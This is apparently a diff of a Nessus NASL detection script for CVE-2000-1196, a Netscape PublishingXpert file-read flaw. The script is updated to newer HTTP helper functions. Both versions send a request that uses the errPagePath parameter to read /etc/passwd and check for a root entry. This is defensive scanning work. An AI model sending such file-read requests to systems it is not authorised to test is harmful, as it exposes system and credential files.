@@ -7,7 +7,7 @@
 if(description)
 {
  script_id(10364);
- script_version ("$Revision: 1.9 $");
+ script_version ("$Revision: 1.13 $");
  script_cve_id("CVE-2000-1196");
  name["english"] = "netscape publishingXpert 2 PSUser problem";
  name["francais"] = "netscape publishingXpert 2 PSUser problem";
@@ -19,8 +19,10 @@ a GET request :
 
 GET  /PSUser/PSCOErrPage.htm?errPagePath=/file/to/read
 
-Risk factor : Medium/High
-Solution : Remove it";
+Solution : Remove it
+
+Risk factor : Medium
+";
 
  desc["francais"] = "Le CGI '/PSUser/PSCOErrPage.htm' permet à un 
 pirate de lire n'importe quel fichier sur la machine cible
@@ -47,7 +49,7 @@ Solution : Supprimez cette page";
  family["english"] = "CGI abuses";
  family["francais"] = "Abus de CGI";
  script_family(english:family["english"], francais:family["francais"]);
- script_dependencie("find_service.nes", "httpver.nasl");
+ script_dependencie("http_version.nasl");
   script_require_ports("Services/www", 80);
  exit(0);
 }
@@ -57,20 +59,16 @@ Solution : Supprimez cette page";
 #
 
 include("http_func.inc");
+include("http_keepalive.inc");
 
-port = get_kb_item("Services/www");
-if(!port)port = 80;
+port = get_http_port(default:80);
+
 
 if(get_port_state(port))
 {
-  req = http_get(item:"/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd",
-  		 port:port);
-  soc = http_open_socket(port);
-  if(soc)
-  {
-   send(socket:soc, data:req);
-   result = http_recv(socket:soc);
-   if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_hole(port);
-  }
+  req = http_get(item:"/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd", port:port);
+  result = http_keepalive_send_recv(port:port, data:req);
+  if ( result == NULL ) exit(0);
+  if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_warning(port);
 }
 
